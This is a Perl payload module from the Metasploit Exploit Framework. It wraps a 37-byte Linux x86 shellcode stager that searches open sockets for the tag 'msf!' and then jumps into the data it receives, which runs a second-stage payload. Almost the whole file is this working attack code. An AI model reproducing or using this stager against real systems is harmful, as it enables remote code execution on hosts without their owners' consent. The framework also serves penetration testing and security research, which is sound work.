###############
##
#
#    Name: BindStager.pm
# Version: $Revision$
#  Source: src/shellcode/linux/ia32/stager_sock_find.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 find tag recieve stager for Linux.
#
##
###############

package Msf::PayloadComponent::Linux::ia32::FindRecvStager;

use strict;
use base 'Msf::PayloadComponent::Linux::FindRecvStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'linux' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					FINDTAG => [ 0x1a, 'RAW' ]
				},
			Payload =>
				"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86\xfb" . 
				"\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x6d\x73\x66\x21\x75\xf0" .
				"\x5f\xfc\xad\xff\xe6"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
